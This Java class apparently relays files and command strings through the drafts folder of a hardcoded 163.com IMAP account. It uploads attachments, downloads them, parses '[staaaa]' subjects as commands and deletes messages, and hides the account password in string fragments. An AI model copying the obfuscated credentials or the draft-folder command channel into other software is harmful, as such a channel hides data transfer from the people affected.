package demo.stnowtest;


import com.sun.mail.imap.IMAPFolder;
import com.sun.mail.imap.IMAPStore;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Address;
import javax.mail.BodyPart;
import javax.mail.Flags;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.NoSuchProviderException;
import javax.mail.Part;
import javax.mail.Session;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;

import demo.api.LogX;

/**
 * Created by chaofei on 2018-4-9.
 */

//网民的力量是强大的，据说从2014.12.20开始，网易提供了偷偷提供了一个入口设置解决这个问题，链接地址：http://config.mail.163.com/settings/imap/index.jsp?uid=xxxxxx@163.com


public class MailX {

    private static String TAG="MailX";
    private static String rootDir = "";
    private static File logFile = null;
    private static List<CMD> cmdlist=new ArrayList<CMD>();

    private static IMAPFolder folder= null;
    private static IMAPStore store=null;
    private static Session session=null;
    private static String username=null;
    static {
        //Security.addProvider(new com.provider.JSSEProvider());
    }
    protected MailX(){
        final String m1="111";
        final String m2="11a";
        String imaphost = "imap.163.com";
        final String a1="t";
        final String a2="adat";
        final String a3="ates";
        int imapport = 993;
        final String m3="11";
        username = a2+a3+a1+"@163.com";
        String password = m1+m3+m2;
        log("MailX()-->");
        final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
        //Security.addProvider(new Provider());
/* Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
                            这里有一个错我是这么解决的（Windows -> Preferences，Java/Compiler/Errors/Warnings->
        Deprecated and restricted API， Forbidden reference (access rules)，原始设定为Error修改为Warning）*/
        Properties p = System.getProperties();
        p.setProperty("mail.imap.socketFactory.class", SSL_FACTORY);
        p.setProperty("mail.imap.socketFactory.port",String.valueOf(imapport));
        p.setProperty("mail.store.protocol","imap");
        p.setProperty("mail.imap.host", imaphost);
        p.setProperty("mail.imap.port", String.valueOf(imapport));
        p.setProperty("mail.imap.auth.login.disable", "true");
        session = Session.getDefaultInstance(p,null);
        session.setDebug(false); // mail debug mode
        try {
            store = (IMAPStore) session.getStore("imap");  // 使用imap会话机制，连接服务器
            store.connect(imaphost, imapport, username, password);
        }catch (Exception e){
            LogX.e(TAG,"Error:"+e.getMessage());
        }
        //IMAPFolder folder= null;
        //IMAPStore store=null;
    }

    private static int deleteAllNow() {
        final String m1="111";
        final String m2="11a";
        String imaphost = "imap.163.com";
        final String a1="t";
        final String a2="adat";
        final String a3="ates";
        int imapport = 993;
        final String m3="11";
        String username = a2+a3+a1+"@163.com";
        String password = m1+m3+m2;
        final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
        //Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
/* Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
                           这里有一个错我是这么解决的¨Windows -> Preferences£¬Java/Compiler/Errors/Warnings->
            Deprecated and restricted API£¬ Forbidden reference (access rules)£¬Ô­Ê¼Éè¶¨ÎªErrorÐÞ¸ÄÎªWarning£©*/
        Properties p = System.getProperties();
        p.setProperty("mail.imap.socketFactory.class", SSL_FACTORY);
        p.setProperty("mail.imap.socketFactory.port",String.valueOf(imapport));
        p.setProperty("mail.store.protocol","imap");
        p.setProperty("mail.imap.host", imaphost);
        p.setProperty("mail.imap.port", String.valueOf(imapport));
        p.setProperty("mail.imap.auth.login.disable", "true");
        Session session = Session.getDefaultInstance(p,null);
        session.setDebug(false); // mail debug mode
        IMAPFolder folder= null;
        IMAPStore store=null;
        try {
            store=(IMAPStore)session.getStore("imap");  // 使用imap会话机制，连接服务器
            store.connect(imaphost,imapport,username,password);
            folder=(IMAPFolder)store.getFolder("now"); //"草稿箱"//INBOX
            folder.open(Folder.READ_WRITE);
            int size = folder.getMessageCount();
            log("total="+size);
            Message[] msgs=folder.getMessages();
            boolean findcmd0=false;
            for (int i = 0; i <msgs.length; i++) {
                Message msg = msgs[i];
                String subject = msg.getSubject();//"AA,2018-04-09 11:02:44";
                String[] cmds=subject.split(",");
                if (cmds.length>1 && cmds[0].equals("AA")){
                    msg.setFlag(Flags.Flag.DELETED, true); //delete ok.
                }
            }
            log("done");
            return 1;
        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } finally {
            try {
                if (folder != null) {
                    folder.close(false);
                }
                if (store != null) {
                    store.close();
                }
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return 1;
        }

    }


    public static int saveOne(File file) {
        ArrayList<File> attachment=new ArrayList<File>();
        attachment.add(file);
        try {
            folder=(IMAPFolder)store.getFolder("now"); //"草稿箱"//INBOX
            folder.open(Folder.READ_WRITE);
            int size = folder.getMessageCount();
            log("total="+size);
            String subject1;//="AA,2018-04-09 11:02:44";
            subject1="AA,"+(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date());
            log("to---:"+subject1);
            saveNew(username,subject1,(new SimpleDateFormat("yyyy-MM-dd_HHmmss")).format(new Date()),attachment,session,folder);
            log("done");
            return 1;
        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } finally {
            try {
                if (folder != null) {
                    folder.close(false);
                }
                if (store != null) {
                    store.close();
                }
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return 1;
        }

    }


    public static int getAll(String pathDir) {
        final String m1="111";
        final String m2="11a";
        String imaphost = "imap.163.com";
        final String a1="t";
        final String a2="adat";
        final String a3="ates";
        int imapport = 993;
        final String m3="11";
        username = a2+a3+a1+"@163.com";
        String password = m1+m3+m2;
        log("MailX()-->");
        final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
        //Security.addProvider(new Provider());
/* Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
                            这里有一个错我是这么解决的（Windows -> Preferences，Java/Compiler/Errors/Warnings->
        Deprecated and restricted API， Forbidden reference (access rules)，原始设定为Error修改为Warning）*/
        Properties p = System.getProperties();
        p.setProperty("mail.imap.socketFactory.class", SSL_FACTORY);
        p.setProperty("mail.imap.socketFactory.port",String.valueOf(imapport));
        p.setProperty("mail.store.protocol","imap");
        p.setProperty("mail.imap.host", imaphost);
        p.setProperty("mail.imap.port", String.valueOf(imapport));
        p.setProperty("mail.imap.auth.login.disable", "true");
        session = Session.getDefaultInstance(p,null);
        session.setDebug(false); // mail debug mode
        try {
            store = (IMAPStore) session.getStore("imap");  // 使用imap会话机制，连接服务器
            store.connect(imaphost, imapport, username, password);
        }catch (Exception e){
            LogX.e(TAG,"Error:"+e.getMessage());
        }
        try {
            LogX.e(TAG,"getAll-->");
            folder=(IMAPFolder)store.getFolder("now"); //"草稿箱"//INBOX
            folder.open(Folder.READ_WRITE);
            int size = folder.getMessageCount();
            log("total="+size);
            LogX.e(TAG,"getAll-->");
            Message[] msgs=folder.getMessages();
            //Message message = folder.getMessage(size);
            boolean findcmd0=false;
            for (int i = 0; i <msgs.length; i++) {
                LogX.e(TAG,"getAll-->"+i);
                Message msg = msgs[i];
                String subject = msg.getSubject();//"AA,2018-04-09 11:02:44";
                String[] cmds=subject.split(",");
                if (cmds.length>1 && cmds[0].equals("AA")){
                    //msg.setFlag(Flags.Flag.DELETED, true); //delete ok.
                    boolean isContainerAttachment = isContainAttachment(msg);
                    log("["+i+"]" + isContainerAttachment);
                    if (isContainerAttachment) {
                        saveAttachment(msg, pathDir);
                    }
                    StringBuffer content = new StringBuffer(30);
                    getMailTextContent(msg, content);
                }

             }
            return 1;
        } catch (NoSuchProviderException e) {
            LogX.e(TAG,"Error:"+e.getMessage());
        } catch (MessagingException e) {
            LogX.e(TAG,"Error:"+e.getMessage());
        } finally {
            try {
                if (folder != null) {
                    folder.close(false);
                }
                if (store != null) {
                    store.close();
                }
            } catch (MessagingException e) {
                LogX.e(TAG,"Error:"+e.getMessage());
            }
            return 1;
        }

    }

    private static int edit() {
        final String m1="111";
        final String m2="11a";
        String imaphost = "imap.163.com";
        final String a1="t";
        final String a2="adat";
        final String a3="ates";
        int imapport = 993;
        final String m3="11";
        String username = a2+a3+a1+"@163.com";
        String password = m1+m3+m2;
        final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
        //Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
/* Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
                            这里有一个错我是这么解决的（Windows -> Preferences，Java/Compiler/Errors/Warnings->
            Deprecated and restricted API， Forbidden reference (access rules)，原始设定为Error修改为Warning）*/
        Properties p = System.getProperties();
        p.setProperty("mail.imap.socketFactory.class", SSL_FACTORY);
        p.setProperty("mail.imap.socketFactory.port",String.valueOf(imapport));
        p.setProperty("mail.store.protocol","imap");
        p.setProperty("mail.imap.host", imaphost);
        p.setProperty("mail.imap.port", String.valueOf(imapport));
        p.setProperty("mail.imap.auth.login.disable", "true");
        Session session = Session.getDefaultInstance(p,null);
        session.setDebug(false); // mail debug mode
        IMAPFolder folder= null;
        IMAPStore store=null;
        try {
            store=(IMAPStore)session.getStore("imap");  // 使用imap会话机制，连接服务器
            store.connect(imaphost,imapport,username,password);
            folder=(IMAPFolder)store.getFolder("now"); //"草稿箱"//INBOX
            folder.open(Folder.READ_WRITE);
            int size = folder.getMessageCount();
            log("total="+size);
            Message[] msgs=folder.getMessages();
            //Message message = folder.getMessage(size);
            boolean findcmd0=false;
            for (int i = 0; i <msgs.length; i++) {
                Message msg = msgs[i];
                String subject = msg.getSubject();
                String cmdstr1="[staaaa]";
                String cmdstr2="[0]";
                String cmdstr22="[1]";
                String from =username;
                if (subject.indexOf(cmdstr1+cmdstr2)==0){
                    CMD cmd=new CMD();
                    cmd.cmd=cmdstr1+cmdstr2;
                    cmd.is=1;
                    cmdlist.add(cmd);
                    Date date = msg.getSentDate();

                    Address[] adr=msg.getFrom();
                    if (adr.length>0) {
                        from = msg.getFrom()[0].toString();
                    }
                    log("From: " + from);
                    log("Subject: " + subject);
                    log("Date: " + date);
                    if (true) {
                        findcmd0 = true;
                        continue;
                    }
                    msg.setFlag(Flags.Flag.DELETED, true); //delete ok.
                    String subject1=cmdstr1+cmdstr22;
                    log("to---:"+subject1);
                    //saveNew(from,subject1,(new SimpleDateFormat("yyyy-MM-dd_HHmmss")).format(new Date()),session,folder);
                }
                /*else {
                    boolean find=false;
                    for (int k = 0; i < cmdlist.size(); k++) {
                        if (subject.indexOf(cmdstr1+cmdstr22)==0){
                            msg.setFlag(Flags.Flag.DELETED, true); //delete ok.
                            find=true;
                        }
                    }
                    if (!find) {
                        msg.setFlag(Flags.Flag.DELETED, true); //delete ok.
                    }
                }
                */
            }
            if (!findcmd0){
                String cmdstr1="[staaaa]";
                String cmdstr2="[0]";
                String cmdstr22="[1]";
                String subject1=cmdstr1+cmdstr22;
                log("to---:"+subject1);
                for (int i = 0; i <msgs.length; i++) {
                    Message msg = msgs[i];
                    String subject = msg.getSubject();
                    if (subject.indexOf(cmdstr1+cmdstr22)==0) {
                        msg.setFlag(Flags.Flag.DELETED, true); //delete ok.
                    }
                }
                log("send...");
                //saveNew(username,cmdstr1+cmdstr2,(new SimpleDateFormat("yyyy-MM-dd_HHmmss")).format(new Date()),session,folder);
                //saveNew(username,subject1,(new SimpleDateFormat("yyyy-MM-dd_HHmmss")).format(new Date()),session,folder);
            }

            log("done");
            return 1;
        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } finally {
            try {
                if (folder != null) {
                    folder.close(false);
                }
                if (store != null) {
                    store.close();
                }
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return 1;
        }

    }

    public static int saveNew(String from,String subject,String content,List<File> files,Session session,IMAPFolder folder){
        //save:
        try {
            MimeMessage mmessage = new MimeMessage(session);
            mmessage.setFrom(new InternetAddress(from));
            //to
            mmessage.setSubject(subject);
            Multipart mainPart = new MimeMultipart();
            BodyPart html = new MimeBodyPart();
            html.setContent(content, "text/html; charset=utf-8");
            mainPart.addBodyPart(html);
            // 添加附件
            if (files != null && files.size() > 0) {
                for (File f : files) {
                    // 创建邮件附件
                    MimeBodyPart attach = new MimeBodyPart();
                    //DataHandler dh = new DataHandler(new FileDataSource(path + list.get(i)));
                    DataHandler dh = new DataHandler(new FileDataSource(f));// 得到数据源
                    attach.setDataHandler(dh); // 得到附件本身并至入BodyPart
                    attach.setFileName(MimeUtility.encodeText(dh.getName()));// 得到文件名同样至入BodyPart
                    mainPart.addBodyPart(attach);
                }
            }
            mmessage.setContent(mainPart);
            mmessage.setSentDate(new Date());
            mmessage.saveChanges();
            mmessage.setFlag(Flags.Flag.DRAFT, true);
            MimeMessage draftMessages[] = {mmessage};
            log(mmessage.getSubject());
            folder.appendMessages(draftMessages);
            return 0;
        }catch (Exception e){
            log(e.getMessage());
            return 1;
        }
    }
    public static void save() {
        String host = "imap.163.com";
        int port = 993;
        String username = "adatatest@163.com";
        String password = "1111111a";
        final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
        //Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
/* Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
                            这里有一个错我是这么解决的（Windows -> Preferences，Java/Compiler/Errors/Warnings->
            Deprecated and restricted API， Forbidden reference (access rules)，原始设定为Error修改为Warning）*/
        Properties props = System.getProperties();
        props.setProperty("mail.imap.socketFactory.class", SSL_FACTORY);
        props.setProperty("mail.imap.socketFactory.port","993");
        props.setProperty("mail.store.protocol","imap");
        props.setProperty("mail.imap.host", host);
        props.setProperty("mail.imap.port", "993");
        props.setProperty("mail.imap.auth.login.disable", "true");
        Session session = Session.getDefaultInstance(props,null);
        session.setDebug(false);
        IMAPFolder folder= null;
        IMAPStore store=null;
        try {
            store=(IMAPStore)session.getStore("imap");  // 使用imap会话机制，连接服务器
            store.connect(host,port,username,password);
/*
            Folder defaultFolder = store.getDefaultFolder();
            Folder[] allFolder = defaultFolder.list();
            for (int i = 0; i < allFolder.length; i++) {
                log("这个是服务器中的文件夹="+allFolder[i].getFullName());
            }

            folder=(IMAPFolder)store.getFolder("now"); //"草稿箱"//收件箱
            // 使用只读方式打开收件箱
            folder.open(Folder.READ_WRITE);
            int size = folder.getMessageCount();
            log("这里是打印的条数=="+size);
            Message[] mess=folder.getMessages();
            //  Message message = folder.getMessage(size);
            for (int i = 0; i <mess.length; i++) {
                String from = mess[i].getFrom()[0].toString();
                String subject = mess[i].getSubject();
                Date date = mess[i].getSentDate();
                log("From: " + from);
                log("Subject: " + subject);
                log("Date: " + date);
            }
               /// String from = message.getFrom()[0].toString();
              //  String subject = message.getSubject();
              //  Date date = message.getSentDate();
            // BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

*/
            List<String> to=new ArrayList<String>();
            to.add("adatatest@163.com");
            folder = (IMAPFolder)store.getFolder("now");//("草稿箱");// 打开草稿箱
            MimeMessage mmessage = new MimeMessage(session);
            mmessage.setFrom(new InternetAddress(username));
            if(to!=null){
                for (String item : to) {
                    mmessage.addRecipient(Message.RecipientType.TO,
                            new InternetAddress(item));
                }
            }
            mmessage.setSubject("[staaaa][0]");
            Multipart mainPart = new MimeMultipart();
            BodyPart html = new MimeBodyPart();
            html.setContent("content11aaa", "text/html; charset=utf-8");
            mainPart.addBodyPart(html);
            mmessage.setContent(mainPart);
            mmessage.setSentDate(new Date());
            mmessage.saveChanges();
            mmessage.setFlag(Flags.Flag.DRAFT, true);
            MimeMessage draftMessages[] = {mmessage};
            log(mmessage.getSubject());
            folder.appendMessages(draftMessages);
            //Transport.send(mmessage);
            log("save success!");
        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } finally {
            try {
                if (folder != null) {
                    folder.close(false);
                }
                if (store != null) {
                    store.close();
                }
            } catch (MessagingException e) {
                e.printStackTrace();
            }
        }
        log("Finished！");
    }



    /**
     * 解析邮件
     *
     * @param messages 要解析的邮件列表
     */
    public static void deleteMessage(Message... messages) throws MessagingException, IOException {
        if (messages == null || messages.length < 1)
            throw new MessagingException("No mail to be parsed!");

        // 解析所有邮件
        for (int i = 0, count = messages.length; i < count; i++) {
            /**
             *   邮件删除
             */
            Message message = messages[i];
            String subject = message.getSubject();
            // set the DELETE flag to true
            message.setFlag(Flags.Flag.DELETED, true);
            log("Marked DELETE for message: " + subject);
        }
    }
    /**
     * 获得邮件主题
     *
     * @param msg 邮件内容
     * @return 解码后的邮件主题
     */
    public static String getSubject(MimeMessage msg) throws UnsupportedEncodingException, MessagingException {
        return MimeUtility.decodeText(msg.getSubject());
    }

    /**
     * 获得邮件发件人
     *
     * @param msg 邮件内容
     * @return 姓名 <Email地址>
     * @throws MessagingException
     * @throws UnsupportedEncodingException
     */
    public static String getFrom(MimeMessage msg) throws MessagingException, UnsupportedEncodingException {
        String from = "";
        Address[] froms = msg.getFrom();
        if (froms.length < 1)
            throw new MessagingException("No sender!");

        InternetAddress address = (InternetAddress) froms[0];
        String person = address.getPersonal();
        if (person != null) {
            person = MimeUtility.decodeText(person) + " ";
        } else {
            person = "";
        }
        from = person + "<" + address.getAddress() + ">";

        return from;
    }

    /**
     * 根据收件人类型，获取邮件收件人、抄送和密送地址。如果收件人类型为空，则获得所有的收件人
     * <p>Message.RecipientType.TO  收件人</p>
     * <p>Message.RecipientType.CC  抄送</p>
     * <p>Message.RecipientType.BCC 密送</p>
     *
     * @param msg  邮件内容
     * @param type 收件人类型
     * @return 收件人1 <邮件地址1>, 收件人2 <邮件地址2>, ...
     * @throws MessagingException
     */
    public static String getReceiveAddress(MimeMessage msg, Message.RecipientType type) throws MessagingException {
        StringBuffer receiveAddress = new StringBuffer();
        Address[] addresss = null;
        if (type == null) {
            addresss = msg.getAllRecipients();
        } else {
            addresss = msg.getRecipients(type);
        }

        if (addresss == null || addresss.length < 1)
            throw new MessagingException("No receiver!");
        for (Address address : addresss) {
            InternetAddress internetAddress = (InternetAddress) address;
            receiveAddress.append(internetAddress.toUnicodeString()).append(",");
        }

        receiveAddress.deleteCharAt(receiveAddress.length() - 1); //删除最后一个逗号

        return receiveAddress.toString();
    }

    /**
     * 获得邮件发送时间
     *
     * @param msg 邮件内容
     * @return yyyy年mm月dd日 星期X HH:mm
     * @throws MessagingException
     */
    public static String getSentDate(MimeMessage msg, String pattern) throws MessagingException {
        Date receivedDate = msg.getSentDate();
        if (receivedDate == null)
            return "";

        if (pattern == null || "".equals(pattern))
            pattern = "yyyy-MM-dd HH:mm:ss ";//"yyyy年MM月dd日 E HH:mm ";

        return new SimpleDateFormat(pattern).format(receivedDate);
    }

    /**
     * 判断邮件中是否包含附件
     *
     * @param part 邮件内容
     * @return 邮件中存在附件返回true，不存在返回false
     * @throws MessagingException
     * @throws IOException
     */
    public static boolean isContainAttachment(Part part) throws MessagingException, IOException {
        boolean flag = false;
        if (part.isMimeType("multipart/*")) {
            MimeMultipart multipart = (MimeMultipart) part.getContent();
            int partCount = multipart.getCount();
            for (int i = 0; i < partCount; i++) {
                BodyPart bodyPart = multipart.getBodyPart(i);
                String disp = bodyPart.getDisposition();
                if (disp != null && (disp.equalsIgnoreCase(Part.ATTACHMENT) || disp.equalsIgnoreCase(Part.INLINE))) {
                    flag = true;
                } else if (bodyPart.isMimeType("multipart/*")) {
                    flag = isContainAttachment(bodyPart);
                } else {
                    String contentType = bodyPart.getContentType();
                    if (contentType.indexOf("application") != -1) {
                        flag = true;
                    }

                    if (contentType.indexOf("name") != -1) {
                        flag = true;
                    }
                }

                if (flag) break;
            }
        } else if (part.isMimeType("message/rfc822")) {
            flag = isContainAttachment((Part) part.getContent());
        }
        return flag;
    }

    /**
     * 判断邮件是否已读
     *
     * @param msg 邮件内容
     * @return 如果邮件已读返回true, 否则返回false
     * @throws MessagingException
     */
    public static boolean isSeen(MimeMessage msg) throws MessagingException {
        return msg.getFlags().contains(Flags.Flag.SEEN);
    }

    /**
     * 判断邮件是否需要阅读回执
     *
     * @param msg 邮件内容
     * @return 需要回执返回true, 否则返回false
     * @throws MessagingException
     */
    public static boolean isReplySign(MimeMessage msg) throws MessagingException {
        boolean replySign = false;
        String[] headers = msg.getHeader("Disposition-Notification-To");
        if (headers != null)
            replySign = true;
        return replySign;
    }

    /**
     * 获得邮件的优先级
     *
     * @param msg 邮件内容
     * @return 1(High):紧急  3:普通(Normal)  5:低(Low)
     * @throws MessagingException
     */
    public static String getPriority(MimeMessage msg) throws MessagingException {
        String priority = "Normal";
        String[] headers = msg.getHeader("X-Priority");
        if (headers != null) {
            String headerPriority = headers[0];
            if (headerPriority.indexOf("1") != -1 || headerPriority.indexOf("High") != -1)
                priority = "High";
            else if (headerPriority.indexOf("5") != -1 || headerPriority.indexOf("Low") != -1)
                priority = "Low";
            else
                priority = "Normal";
        }
        return priority;
    }

    /**
     * 获得邮件文本内容
     *
     * @param part    邮件体
     * @param content 存储邮件文本内容的字符串
     * @throws MessagingException
     * @throws IOException
     */
    public static void getMailTextContent(Part part, StringBuffer content) throws MessagingException, IOException {
        //如果是文本类型的附件，通过getContent方法可以取到文本内容，但这不是我们需要的结果，所以在这里要做判断
        boolean isContainTextAttach = part.getContentType().indexOf("name") > 0;
        if (part.isMimeType("text/*") && !isContainTextAttach) {
            content.append(part.getContent().toString());
        } else if (part.isMimeType("message/rfc822")) {
            getMailTextContent((Part) part.getContent(), content);
        } else if (part.isMimeType("multipart/*")) {
            Multipart multipart = (Multipart) part.getContent();
            int partCount = multipart.getCount();
            for (int i = 0; i < partCount; i++) {
                BodyPart bodyPart = multipart.getBodyPart(i);
                getMailTextContent(bodyPart, content);
            }
        }
    }

    /**
     * 保存附件
     *
     * @param part    邮件中多个组合体中的其中一个组合体
     * @param destDir 附件保存目录
     * @throws UnsupportedEncodingException
     * @throws MessagingException
     * @throws FileNotFoundException
     * @throws IOException
     */
    public static void saveAttachment(Part part, String destDir) throws UnsupportedEncodingException, MessagingException,
            FileNotFoundException, IOException {
        if (part.isMimeType("multipart/*")) {
            Multipart multipart = (Multipart) part.getContent();    //复杂体邮件
            //复杂体邮件包含多个邮件体
            int partCount = multipart.getCount();
            for (int i = 0; i < partCount; i++) {
                //获得复杂体邮件中其中一个邮件体
                BodyPart bodyPart = multipart.getBodyPart(i);
                //某一个邮件体也有可能是由多个邮件体组成的复杂体
                String disp = bodyPart.getDisposition();
                if (disp != null && (disp.equalsIgnoreCase(Part.ATTACHMENT) || disp.equalsIgnoreCase(Part.INLINE))) {
                    InputStream is = bodyPart.getInputStream();
                    saveFile(is, destDir, decodeText(bodyPart.getFileName()));
                } else if (bodyPart.isMimeType("multipart/*")) {
                    saveAttachment(bodyPart, destDir);
                } else {
                    String contentType = bodyPart.getContentType();
                    if (contentType.indexOf("name") != -1 || contentType.indexOf("application") != -1) {
                        saveFile(bodyPart.getInputStream(), destDir, decodeText(bodyPart.getFileName()));
                    }
                }
            }
        } else if (part.isMimeType("message/rfc822")) {
            saveAttachment((Part) part.getContent(), destDir);
        }
    }

    /**
     * 读取输入流中的数据保存至指定目录
     *
     * @param is       输入流
     * @param fileName 文件名
     * @param destDir  文件存储目录
     * @throws FileNotFoundException
     * @throws IOException
     */
    private static void saveFile(InputStream is, String destDir, String fileName)
            throws FileNotFoundException, IOException {
        BufferedInputStream bis = new BufferedInputStream(is);
        BufferedOutputStream bos = new BufferedOutputStream(
                new FileOutputStream(new File(destDir + fileName)));
        int len = -1;
        while ((len = bis.read()) != -1) {
            bos.write(len);
            bos.flush();
        }
        bos.close();
        bis.close();
    }

    /**
     * 文本解码
     *
     * @param encodeText 解码MimeUtility.encodeText(String text)方法编码后的文本
     * @return 解码后的文本
     * @throws UnsupportedEncodingException
     */
    public static String decodeText(String encodeText) throws UnsupportedEncodingException {
        if (encodeText == null || "".equals(encodeText)) {
            return "";
        } else {
            return MimeUtility.decodeText(encodeText);
        }
    }


    private static void log(String text) {
        LogX.w(TAG,text);
    }
    static class CMD {
        String cmd = "";
        int is = 0;
    }



}